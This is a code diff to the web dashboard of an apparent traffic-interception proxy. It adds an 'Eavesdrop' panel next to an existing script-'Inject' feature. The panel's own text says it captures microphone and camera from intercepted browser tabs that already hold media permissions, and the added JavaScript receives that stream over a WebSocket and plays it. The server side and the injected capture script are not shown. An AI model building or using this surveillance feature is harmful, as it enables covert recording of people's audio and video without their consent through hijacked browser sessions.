@@ -502,6 +502,66 @@ html, body {
   padding:0 4px; margin-left:5px; vertical-align:middle;
   line-height:16px;
 }
+
+/* ── Eavesdrop panel ───────────────────────────────────────────────────────── */
+#btn-eavesdrop { position:relative; }
+#btn-eavesdrop .edrop-dot {
+  position:absolute; top:4px; right:4px;
+  width:6px; height:6px; border-radius:50%;
+  background: var(--red);
+  display: none;
+}
+#btn-eavesdrop.armed { color:var(--red); border-color:var(--red); background:var(--red-dim); }
+#btn-eavesdrop.armed .edrop-dot { display:block; animation: pulse-dot 1.5s infinite; }
+
+#eavesdrop-panel {
+  flex-shrink: 0;
+  display: none;
+  flex-direction: column;
+  background: var(--bg1);
+  border-bottom: 1px solid var(--border);
+  padding: 12px 16px 14px;
+  gap: 10px;
+}
+#eavesdrop-panel.open { display: flex; }
+
+.edrop-topbar { display:flex; align-items:center; gap:10px; }
+.edrop-title {
+  font-size:11px; text-transform:uppercase; letter-spacing:.08em;
+  color:var(--text-dim); font-weight:600;
+}
+.edrop-badge {
+  font-size:10px; font-weight:700; padding:2px 8px; border-radius:10px;
+  background:var(--bg3); color:var(--text-mute); border:1px solid var(--border);
+  transition: all .2s;
+}
+.edrop-badge.active { background:var(--red-dim); color:var(--red); border-color:var(--red); }
+
+#eavesdrop-video-wrap {
+  background: #000;
+  border-radius: 6px;
+  border: 1px solid var(--border);
+  min-height: 140px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  position: relative;
+  overflow: hidden;
+}
+#eavesdrop-video { max-width:100%; max-height:240px; display:block; }
+#eavesdrop-placeholder {
+  position:absolute; color:var(--text-dim); font-size:12px;
+  text-align:center; padding:12px; pointer-events:none;
+}
+
+.edrop-footer { display:flex; align-items:center; gap:8px; }
+.edrop-hint { font-size:11px; color:var(--text-dim); margin-right:auto; }
+
+.btn-edrop-enable {
+  background:var(--red-dim); border-color:var(--red);
+  color:var(--red); font-weight:600;
+}
+.btn-edrop-enable:hover { background:var(--red); color:#fff; }
 </style>
 </head>
 <body>
@@ -561,6 +621,10 @@ html, body {
       &lt;/&gt;&nbsp;Inject
       <span class="inj-dot"></span>
     </button>
+    <button class="btn" id="btn-eavesdrop" title="Toggle eavesdrop panel">
+      ◉&nbsp;Eavesdrop
+      <span class="edrop-dot"></span>
+    </button>
     <span class="filter-info" id="filter-info"></span>
   </div>
 
@@ -584,6 +648,28 @@ html, body {
       <button class="btn" id="btn-inj-clear">✕&nbsp;Clear</button>
       <button class="btn" id="btn-inj-disable" style="display:none">■&nbsp;Disable</button>
       <button class="btn btn-inject-apply" id="btn-inj-apply">▶&nbsp;Apply &amp; Enable</button>
+    </div>
+  </div>
+
+  <!-- ── Eavesdrop panel ── -->
+  <div id="eavesdrop-panel">
+    <div class="edrop-topbar">
+      <span class="edrop-title">Eavesdrop</span>
+      <span class="edrop-badge" id="edrop-badge">INACTIVE</span>
+      <span style="margin-left:auto;font-size:11px;color:var(--text-dim)">
+        Captures mic/camera from tabs with existing permissions &middot; End-user is notified via <code style="color:var(--text-mute)">alert()</code>
+      </span>
+    </div>
+
+    <div id="eavesdrop-video-wrap">
+      <video id="eavesdrop-video" autoplay muted playsinline></video>
+      <div id="eavesdrop-placeholder">No active stream<br><span style="font-size:11px;opacity:.6">Enable eavesdrop then visit a page where the browser has already granted mic/camera access</span></div>
+    </div>
+
+    <div class="edrop-footer">
+      <span class="edrop-hint" id="edrop-hint">Inactive</span>
+      <button class="btn" id="btn-edrop-disable" style="display:none">&#9646;&nbsp;Disable</button>
+      <button class="btn btn-edrop-enable" id="btn-edrop-enable">&#9685;&nbsp;Enable Eavesdrop</button>
     </div>
   </div>
 
@@ -1013,6 +1099,8 @@ function connect() {
       clearAll();
     } else if (msg.type === 'inject_state') {
       applyInjectState(msg.enabled, msg.script);
+    } else if (msg.type === 'eavesdrop_state') {
+      edropApplyState(msg.enabled);
     }
   };
 }
@@ -1200,6 +1288,124 @@ $injEditor.addEventListener('keydown', e => {
 fetch('/api/inject')
   .then(r => r.json())
   .then(d => applyInjectState(d.enabled, d.script))
+  .catch(() => {});
+
+// ── Eavesdrop ─────────────────────────────────────────────────────────────────
+const $edropPanel   = document.getElementById('eavesdrop-panel');
+const $edropBadge   = document.getElementById('edrop-badge');
+const $edropHint    = document.getElementById('edrop-hint');
+const $btnEavesdrop = document.getElementById('btn-eavesdrop');
+const $btnEdropEn   = document.getElementById('btn-edrop-enable');
+const $btnEdropDis  = document.getElementById('btn-edrop-disable');
+const $edropVideo   = document.getElementById('eavesdrop-video');
+const $edropPh      = document.getElementById('eavesdrop-placeholder');
+
+let edropActive    = false;
+let edropWs        = null;
+let edropMs        = null;
+let edropSb        = null;
+let edropBuf       = [];
+let edropHasStream = false;
+
+function edropApplyState(enabled) {
+  edropActive = enabled;
+  $btnEavesdrop.classList.toggle('armed', enabled);
+  $edropBadge.textContent = enabled ? 'ACTIVE' : 'INACTIVE';
+  $edropBadge.classList.toggle('active', enabled);
+  $btnEdropEn.style.display  = enabled ? 'none' : '';
+  $btnEdropDis.style.display = enabled ? '' : 'none';
+  $edropHint.textContent = enabled
+    ? 'Active — awaiting stream from an intercepted page with media permissions'
+    : 'Inactive';
+  $edropHint.style.color = enabled ? 'var(--red)' : 'var(--text-dim)';
+
+  if (enabled) {
+    edropConnect();
+  } else {
+    if (edropWs) { edropWs.close(); edropWs = null; }
+    edropHasStream = false;
+    $edropPh.style.display = '';
+    $edropVideo.src = '';
+  }
+}
+
+function edropConnect() {
+  if (edropWs && edropWs.readyState < 2) return;
+  edropBuf = [];
+  edropMs  = null;
+  edropSb  = null;
+
+  const proto = location.protocol === 'https:' ? 'wss:' : 'ws:';
+  edropWs = new WebSocket(`${proto}//${location.host}/api/eavesdrop/view`);
+  edropWs.binaryType = 'arraybuffer';
+
+  edropWs.onopen = () => {
+    edropMs = new MediaSource();
+    $edropVideo.src = URL.createObjectURL(edropMs);
+    edropMs.addEventListener('sourceopen', () => {
+      const mimes = [
+        'video/webm; codecs="vp8, opus"',
+        'video/webm; codecs="vp9, opus"',
+        'video/webm',
+        'audio/webm; codecs="opus"',
+        'audio/webm',
+      ];
+      const mime = mimes.find(m => MediaSource.isTypeSupported(m)) || 'video/webm';
+      try {
+        edropSb = edropMs.addSourceBuffer(mime);
+        edropSb.mode = 'sequence';
+        edropSb.addEventListener('updateend', edropFlush);
+      } catch(_) {}
+    });
+  };
+
+  edropWs.onmessage = ({ data }) => {
+    if (!(data instanceof ArrayBuffer)) return;
+    if (!edropHasStream) {
+      edropHasStream = true;
+      $edropPh.style.display = 'none';
+    }
+    edropBuf.push(data);
+    edropFlush();
+  };
+
+  edropWs.onclose = () => {
+    if (edropActive) setTimeout(edropConnect, 2000);
+  };
+}
+
+function edropFlush() {
+  if (!edropSb || edropSb.updating || !edropBuf.length) return;
+  try { edropSb.appendBuffer(edropBuf.shift()); } catch(_) { edropBuf = []; }
+}
+
+async function sendEdropState(enabled) {
+  try {
+    await fetch('/api/eavesdrop', {
+      method:  'POST',
+      headers: { 'content-type': 'application/json' },
+      body:    JSON.stringify({ enabled }),
+    });
+  } catch { /* ignore */ }
+}
+
+$btnEavesdrop.addEventListener('click', () => {
+  $edropPanel.classList.toggle('open');
+});
+
+$btnEdropEn.addEventListener('click', async () => {
+  await sendEdropState(true);
+  edropApplyState(true);
+});
+
+$btnEdropDis.addEventListener('click', async () => {
+  await sendEdropState(false);
+  edropApplyState(false);
+});
+
+fetch('/api/eavesdrop')
+  .then(r => r.json())
+  .then(d => { if (d.enabled) edropApplyState(true); })
   .catch(() => {});
 
 // ── Keyboard shortcuts ────────────────────────────────────────────────────────
